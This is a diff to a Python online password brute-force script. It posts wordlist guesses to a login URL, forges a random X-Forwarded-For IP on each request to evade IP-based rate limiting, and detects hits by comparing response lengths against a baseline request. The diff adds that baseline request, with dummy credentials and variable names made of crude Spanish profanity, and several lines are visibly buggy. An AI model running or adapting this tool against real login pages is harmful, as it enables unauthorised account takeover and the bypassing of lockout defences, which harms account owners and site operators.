@@ -44,7 +44,8 @@ def load_words(WORDLIST_FILENAME):
                 wordlist.append(wordlist)
                 my_str=line
                 final_str=my_str[:-1]
-                uuuuuu = requests.post(args.url)
+                ppp = {'username': "follando_con",'password': "dragones",'user': "enun",'pass': "portal"}
+                uuuuuu = requests.post(args.url,data=ppp)
                 b = randint(op1, op2)
                 c = randint(op1, op2)
                 d = randint(op1, op2)
@@ -58,21 +59,29 @@ def load_words(WORDLIST_FILENAME):
                 ip = bb+dot+cc+dot+dd+dot+ee
                 ip2 = str(ip)
                 headers = {
-                'X-Forwarded-For': ip2
-                }
+                'X-Forwarded-For': ip2,
+}
                 resp = requests.post(args.url,data=pp,proxies=False,headers=headers)
+                polla = len(resp.content)
                 bbb = resp.status_code
                 arr = len(resp.content)
                 aaaas = len(resp.content)
                 if args.hl == None:
                   if args.hl == aaaas:
                     pass
+                    print(polla)
                   else:
                     if arr != len(uuuuuu.content):
-                      print("[+] Status code:",f"{bcolors.OK}200{bcolors.RESET}","Password:",final_str,"[+] Content Lenght:",len(resp.content))
+                      print(f"{bcolors.OK}[+] Password:{bcolors.RESET}",final_str,"=",f"{bcolors.OK}Content Lenght:{bcolors.RESET}",polla)
                     elif bbb == 404:
                       a + 1
                     else:
                       a + 1
+                else:
+                  if len(uuuuuu.content) == polla:
+                    pass
+                  else:
+                    print(f"{bcolors.OK}[+] Password:{bcolors.RESET}",final_str,"= Content Lenght:",polla)
+
                   
 wordlist = load_words(args.wordlist)
